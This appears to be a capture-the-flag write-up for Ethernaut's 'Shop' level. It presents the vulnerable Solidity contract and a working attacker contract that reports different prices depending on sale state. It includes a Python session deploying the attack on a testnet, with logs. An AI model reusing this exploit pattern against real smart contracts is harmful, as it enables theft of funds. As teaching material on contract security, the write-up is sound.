# 21 - Shop

## Challenge

Сan you get the item from the shop for less than the price asked?

Things that might help:

- `Shop` expects to be used from a `Buyer`
- Understanding restrictions of view functions

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

## Summary

Very simple level.

- Write a `Buyer` contract that implements the `price()` function
- When `if (_buyer.price()` is called, `isSold` is false, we return 100 here
- When `price = _buyer.price();` is called, `isSold` is true, we return 0 here in `Buyer` so it sets a lower price.

## Walkthrough

```py
>>> from cheb3 import Connection
>>> from cheb3.utils import compile_sol
>>> conn = Connection("https://goerli.infura.io/v3/<key>")
>>> account = conn.account("<priv_key>")
>>> contract_addr = '0x6f6214026b7fc9e4e087C79C9522Afa87196ddF5'
```

Deploy the buyer contract:

```py
>>> abi, bytecode = compile_sol('''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function isSold() external view returns (bool);
    function buy() external;
}

contract Buyer {
    IShop shop;

    constructor(address _shop) public {
        shop = IShop(_shop);
    }

    function price() external view returns (uint) {
        if (shop.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }

    function attack() external {
        shop.buy();
    }
}
''',
solc_version="0.8.17",
base_path="Ethernaut/node_modules/"
)['Buyer']
>>> attackContract = conn.contract(account, abi=abi, bytecode=bytecode)
>>> attackContract.deploy(contract_addr)
2023-06-29 22:29:36.552 | DEBUG    | cheb3.contract:deploy:94 - Deploying contract ...
2023-06-29 22:29:39.211 | INFO     | cheb3.contract:deploy:99 - The contract is deployed at 0x76332574cdc75e1E9f220316B1A88A725786b3B3
```

Now call `attack`:

```py
>>> attackContract.functions.attack().send_transaction()
2023-06-29 22:30:27.299 | INFO     | cheb3.contract:send_transaction:236 - (0x76332574cdc75e1E9f220316B1A88A725786b3B3).attack transaction hash: 0xc75ef39275ccc684b5548cb6e213aec7f9f1da55847065c4c99307ad549b7b28
```

Now, `await contract.price()` shows 0 as expected. Finally, submit the instance to pass the level.

## Afterword

Contracts can manipulate data seen by other contracts in any way they want.

It's unsafe to change the state based on external and untrusted contracts logic.